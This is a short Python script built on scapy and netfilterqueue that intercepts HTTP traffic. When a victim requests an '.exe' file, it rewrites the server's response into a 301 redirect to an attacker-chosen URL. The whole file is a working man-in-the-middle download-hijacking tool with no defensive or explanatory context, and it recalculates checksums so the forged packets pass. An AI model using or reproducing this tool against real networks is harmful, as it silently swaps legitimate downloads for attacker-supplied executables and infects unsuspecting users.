import netfilterqueue
import scapy.all as scapy
import argparse

ack_list = []


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url",
                        help="url to exe file")
    options = parser.parse_args()
    return options


def change_payload(packet, url):
    packet[scapy.Raw].load = """HTTP/1.1 301 Moved Permanently
                                Location: {}\n""".format(url)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def replace_file(packet):
    options = get_arguments()
    http_packet = scapy.IP(packet.get_payload())
    if http_packet.haslayer(scapy.Raw):
        if http_packet[scapy.TCP].dport == 80:
            if ".exe" in http_packet[scapy.Raw].load:
                ack_list.append(http_packet[scapy.TCP].ack)
        elif http_packet[scapy.TCP].sport == 80:
            if http_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(http_packet[scapy.TCP].seq)
                print("Replacing file")
                hacked_packet = change_payload(http_packet, options.url)
                packet.set_payload(str(hacked_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, replace_file)
queue.run()
